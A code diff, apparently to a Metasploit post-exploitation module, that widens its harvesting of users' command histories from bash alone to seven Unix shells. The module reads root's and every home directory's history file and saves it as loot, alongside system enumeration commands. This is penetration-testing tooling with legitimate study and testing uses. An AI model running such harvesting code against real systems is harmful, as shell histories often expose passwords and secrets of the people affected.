@@ -43,7 +43,10 @@ class Metasploit3 < Msf::Post
     user = execute("/usr/bin/whoami")
 
     mount = execute("/bin/mount -l")
-    get_bash_history(users, user)
+    shells = ['ash', 'bash', 'csh', 'ksh', 'sh', 'tcsh', 'zsh']
+    shells.each do |shell|
+      get_shell_history(users, user, shell)
+    end
     get_sql_history(users, user)
     get_vim_history(users, user)
     last = execute("/usr/bin/last && /usr/bin/lastlog")
@@ -84,25 +87,25 @@ class Metasploit3 < Msf::Post
     return output
   end
 
-  def get_bash_history(users, user)
+  def get_shell_history(users, user, shell)
+    return if shell.nil?
     if user == "root" and users != nil
       users = users.chomp.split()
       users.each do |u|
         if u == "root"
-          vprint_status("Extracting history for #{u}")
-          hist = cat_file("/root/.bash_history")
+          vprint_status("Extracting #{shell} history for #{u}")
+          hist = cat_file("/root/.#{shell}_history")
         else
-          vprint_status("Extracting history for #{u}")
-          hist = cat_file("/home/#{u}/.bash_history")
+          vprint_status("Extracting #{shell} history for #{u}")
+          hist = cat_file("/home/#{u}/.#{shell}_history")
         end
-
-        save("History for #{u}", hist) unless hist.nil? || hist =~ /No such file or directory/
+        save("#{shell} History for #{u}", hist) unless hist.blank? || hist =~ /No such file or directory/
       end
     else
-      vprint_status("Extracting history for #{user}")
-      hist = cat_file("/home/#{user}/.bash_history")
+      vprint_status("Extracting #{shell} history for #{user}")
+      hist = cat_file("/home/#{user}/.#{shell}_history")
       vprint_status(hist)
-      save("History for #{user}", hist) unless hist.nil? || hist =~ /No such file or directory/
+      save("#{shell} History for #{user}", hist) unless hist.blank? || hist =~ /No such file or directory/
     end
   end
 
